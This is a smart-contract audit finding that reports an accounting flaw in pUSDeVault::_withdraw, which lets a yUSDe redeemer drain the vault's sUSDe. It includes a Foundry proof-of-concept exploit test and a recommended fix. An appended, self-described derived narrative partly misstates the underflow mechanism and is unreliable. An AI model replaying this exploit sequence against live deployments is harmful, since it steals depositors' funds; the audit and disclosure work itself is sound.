---
id: 2498
severity: "High"
---

# An attacker can drain the entire protocol balance of sUSDe during the yield phase due to incorrect redemption accounting logic in `pUSDeVault::_withdraw`

## Description

After transitioning to the yield phase, the entire protocol balance of USDe is deposited into sUSDe and pUSDe can be deposited into the yUSDe vault to earn additional yield from the sUSDe. When initiating a redemption, `yUSDeVault::_withdraw` is called which in turn invokes `pUSDeVault::redeem`:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }

        _burn(owner, shares);
        pUSDeVault.redeem(pUSDeAssets, receiver, address(this));
        emit Withdraw(caller, receiver, owner, pUSDeAssets, shares);
    }
```

This is intended to have the overall effect of atomically redeeming yUSDe -> pUSDe -> sUSDe by previewing and applying any necessary yield from sUSDe:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
                assets += previewYield(caller, shares);

                uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

However, by incrementing `assets` in the case where this is a yUSDe redemption and there has been yield accrued by sUSDe, this will attempt to decrement the `depositedBase` state by more than intended:

```solidity
    function _withdraw(
            address token,
            address caller,
            address receiver,
            address owner,
            uint256 baseAssets,
            uint256 tokenAssets,
            uint256 shares
        ) internal virtual {
            if (caller != owner) {
                _spendAllowance(owner, caller, shares);
            }
            depositedBase -= baseAssets; // @audit - this can underflow when redeeming yUSDe because previewYield() increments assets based on sUSDe preview but this decrement should be equivalent to the base asset amount that is actually withdrawn from the vault (without yield)

            _burn(owner, shares);
            SafeERC20.safeTransfer(IERC20(token), receiver, tokenAssets);
            onAfterWithdrawalChecks();

            emit Withdraw(caller, receiver, owner, baseAssets, shares);
            emit OnMetaWithdraw(receiver, token, tokenAssets, shares);
        }
```

If the incorrect state update results in an unexpected underflow then yUSDe depositors may be unable to redeem their shares (principal + yield). However, if a faulty yUSDe redemption is processed successfully (i.e. if the relative amount of USDe underlying pUSDe is sufficiently large compared to the total supply of yUSDe and the corresponding sUSDe yield) then pUSDe depositors will erroneously and unexpectedly redeem their shares for significantly less USDe than they originally deposited. This effect will be magnified by subsequent yUSDe redemptions as the `total_yield_USDe` will be computed as larger than it is in reality due to `depositedBase` being much smaller than it should be:

```solidity
    function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {
            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
            uint y_pUSDeShares = balanceOf(caller);

            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }
```

This in turn causes `depositedBase` to be further decremented until it is eventually tends to zero, impacting all functionality that relies of the overridden `totalAssets()`. Given that it is possible to inflate the sUSDe yield by either transferring USDe directly or waiting to sandwich a legitimate yield accrual (since `sUSDe::previewRedeem` does not account for the vesting schedule) this allows an attacker to completely devastate the pUSDe/yUSDe accounting, redeeming their yUSDe for close to the entire protocol sUSDe balance at the expense of all other depositors.

Significant loss of user funds.

## Proof of Concept

```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract CritTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        // Prepare Ethena and Ethreal contracts
        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        // Prepare pUSDe and Depositor contracts
        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_crit() public {
        uint256 aliceDeposit = 100 ether;
        uint256 bobDeposit = 2 * aliceDeposit;

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 100 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        {
            // bob redeems from yUSDe
            uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/2, bob, bob);
            uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (1): %s", bobRedeemed_sUSDe);
            console2.log("Bob} redeemed USDe (1): %s", bobRedeemed_USDe);

            // bob can redeem again
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/5, bob, bob);
            uint256 bobRedeemed_sUSDe_2 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_2 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (2): %s", bobRedeemed_sUSDe_2);
            console2.log("Bob redeemed USDe (2): %s", bobRedeemed_USDe_2);

            // bob redeems once more
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/6, bob, bob);
            uint256 bobRedeemed_sUSDe_3 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_3 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (3): %s", bobRedeemed_sUSDe_3);
            console2.log("Bob redeemed USDe (3): %s", bobRedeemed_USDe_3);
        }

        console2.log("pUSDe balance of sUSDe after bob's redemptions: %s", sUSDe.balanceOf(address(pUSDe)));
        console2.log("pUSDe depositedBase after bob's redemptions: %s", pUSDe.depositedBase());

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe: %s", aliceRedeemed_USDe);
        console2.log("Alice lost %s USDe", aliceDeposit - aliceRedeemed_USDe);

        // uncomment to observe the assertion fail
        // assertApproxEqAbs(aliceRedeemed_USDe, aliceDeposit, 10, "Alice should redeem approximately her deposit in USDe");
    }
}
```

## Recommendation

While the assets corresponding to the accrued yield should be included when previewing the sUSDe withdrawal, only the base assets should be passed to the subsequent call to `_withdraw()`:

```diff
function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

        if (PreDepositPhase.YieldPhase == currentPhase) {
            // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
--          assets += previewYield(caller, shares);
++          uint256 assetsPlusYield = assets + previewYield(caller, shares);

--          uint sUSDeAssets = sUSDe.previewWithdraw(assets);
++          uint sUSDeAssets = sUSDe.previewWithdraw(assetsPlusYield);

            _withdraw(
                address(sUSDe),
                caller,
                receiver,
                owner,
                assets,
                sUSDeAssets,
                shares
            );
            return;
        }
    ...
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an accounting mismatch in the redemption flow of the yield‑bearing vault that allows the protocol balance of sUSDe to be drained during the YieldPhase. When a user redeems yUSDe, the contract calls previewYield to calculate the accrued yield and adds this amount to the assets variable. The inflated assets value is then passed to an internal _withdraw function, which mistakenly subtracts the same inflated amount from the depositedBase state variable. Because depositedBase should only be reduced by the base assets actually withdrawn, the subtraction can underflow, causing depositedBase to shrink far below the true amount of underlying USDe. This underflow does not immediately surface because sUSDe.previewWithdraw rounds up, masking the discrepancy, but repeated redemptions amplify the error, inflating the reported total yield and allowing an attacker to withdraw far more sUSDe than they are entitled to. The attack scenario consists of depositing yUSDe, waiting for or artificially creating yield (for example by transferring USDe directly into the sUSDe contract), then repeatedly calling redeem. Each redemption transfers out an amount of sUSDe based on the inflated assets while incorrectly decreasing depositedBase, eventually driving depositedBase to zero and enabling the attacker to drain almost the entire sUSDe balance at the expense of other depositors. From a user’s perspective, redemptions return far less USDe than expected, balances may unexpectedly become zero, and the protocol’s total assets appear to shrink, violating the invariant that totalAssets equals depositedBase plus accrued yield. The bug was discovered during a manual audit and testing by Cyfrin, and it is hard to notice because the rounding behavior hides the underflow until multiple redemptions occur. The recommended fix is to keep the base assets separate from the yield: use the original assets amount when decrementing depositedBase and only apply the yield to the token transfer, thereby restoring correct accounting and preventing the protocol balance from being drained.
